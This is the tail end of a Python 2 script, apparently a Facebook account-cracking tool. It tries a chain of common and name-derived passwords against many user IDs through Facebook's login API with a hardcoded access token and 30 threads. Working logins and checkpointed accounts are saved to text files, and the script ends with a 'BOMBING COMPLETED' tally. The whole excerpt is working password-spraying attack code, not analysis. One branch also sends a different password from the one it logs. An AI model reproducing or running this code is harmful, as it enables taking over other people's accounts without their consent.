																																	cp.write(uid+"|"+pass15+"\n")
																																	cp.close()											
																																	cps.append(uid+pass15)	
																																else:
																																	pass16 = "1234567890"
																																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass16+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																	q = json.loads(data)
																																	if "access_token" in q and "EAAA" in q:
																																		print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass16+"\033[0;97m")
																																		okc+=1
																																		ok = open("ok.txt", "a")
																																		ok.write(uid+"|"+pass16+"\n")
																																		ok.close()
																																		oks.append(uid+pass16)
																																	else:
																																		if "www.facebook.com" in data.json()['error_msg']:
																																			print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass16+"\033[0;97m")
																																			cpc+=1
																																			cp = open("rat.txt", "a")
																																			cp.write(uid+"|"+pass16+"\n")
																																			cp.close()
																																			cps.append(uid+pass16)
																																		else:
																																			pass17 = "112233"
																																			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass17+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																			q = json.loads(data)
																																			if "access_token" in q and "EAAA" in q:
																																				print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass17+"\033[0;97m")
																																				okc+=1
																																				ok = open("ok.txt", "a")
																																				ok.write(uid+"|"+pass17+"\n")
																																				ok.close()
																																				oks.append(uid+pass17)
																																			else:
																																				if "www.facebook.com" in data.json()['error_msg']:
																																					print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass17+"\033[0;97m")
																																					cpc+=1
																																					cp = open("rat.txt", "a")
																																					cp.write(uid+"|"+pass17+"\n")
																																					cp.close()
																																					cps.append(uid+pass17)
																																				else:
																																					pass18 = "223344"
																																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass18+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																					q = json.loads(data)
																																					if "access_token" in q and "EAAA" in q:
																																						print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass18+"\033[0;97m")
																																						okc+=1
																																						ok = open("ok.txt", "a")
																																						ok.write(uid+"|"+pass18+"\n")
																																						ok.close()
																																						oks.append(uid+pass18)
																																					else:
																																						if "www.facebook.com" in data.json()['error_msg']:
																																							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass18+"\033[0;97m")
																																							cpc+=1
																																							cp = open("rat.txt", "a")
																																							cp.write(uid+"|"+pass18+"\n")
																																							cp.close()
																																							cps.append(uid+pass18)
																																						else:
																																							pass19 = "786786"
																																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																							q = json.loads(data)
																																							if "access_token" in q and "EAAA" in q:
																																								print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass19+"\033[0;97m")
																																								okc+=1
																																								ok = open("ok.txt", "a")
																																								ok.write(uid+"|"+pass19+"\n")
																																								ok.close()
																																								oks.append(uid+pass19)
																																							else:
																																								if "www.facebook.com" in data.json()['error_msg']:
																																									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass19+"\033[0;97m")
																																									cpc+=1
																																									cp = open("rat.txt", "a")
																																									cp.write(uid+"|"+pass19+"\n")
																																									cp.close()
																																									cps.append(uid+pass19)
																																								else:
																																									pass20 = name.lower().split(' ')[0] + '786'
																																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass20+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																									q = json.loads(data)
																																									if "access_token" in q and "EAAA" in q:
																																										print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass20+"\033[0;97m")
																																										okc+=1
																																										ok = open("ok.txt", "a")
																																										ok.write(uid+"|"+pass20+"\n")
																																										ok.close()
																																										oks.append(uid+pass20)
																																									else:
																																										if "www.facebook.com" in data.json()['error_msg']:
																																											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass20+"\033[0;97m")
																																											cpc+=1
																																											cp = open("rat.txt", "a")
																																											cp.write(uid+"|"+pass20+"\n")
																																											cp.close()
																																											cps.append(uid+pass20)
																																										else:
																																											pass21 = name.lower().split(' ')[1] + '786'
																																											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass21+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																											q = json.loads(data)
																																											if "access_token" in q and "EAAA" in q:
																																												print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass21+"\033[0;97m")
																																												okc+=1
																																												ok = open("ok.txt", "a")
																																												ok.write(uid+"|"+pass21+"\n")
																																												ok.close()
																																												oks.append(uid+pass21)
																																											else:
																																												if "www.facebook.com" in data.json()['error_msg']:
																																													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass21+"\033[0;97m")
																																													cpc+=1
																																													cp = open("rat.txt", "a")
																																													cp.write(uid+"|"+pass21+"\n")
																																													cp.close()
																																													cps.append(uid+pass21)
																																												else:
																																													pass22 = "778899"
																																													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass22+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																																													q = json.loads(data)
																																													if "access_token" in q and "EAAA" in q:
																																														print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass22+"\033[0;97m")
																																														okc+=1
																																														ok = open("ok.txt", "a")
																																														ok.write(uid+"|"+pass22+"\n")
																																														ok.close()
																																														oks.append(uid+pass22)
																																													else:
																																														if "www.facebook.com" in data.json()['error_msg']:
																																															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass22+"\033[0;97m")
																																															cpc+=1
																																															cp = open("rat.txt", "a")
																																															cp.write(uid+"|"+pass22+"\n")
																																															cp.close()
																																															cps.append(uid+pass22)								
		
										
		except:
			pass
		loop+=1
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m BOMBING COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()

if __name__ == '__main__':
	main()

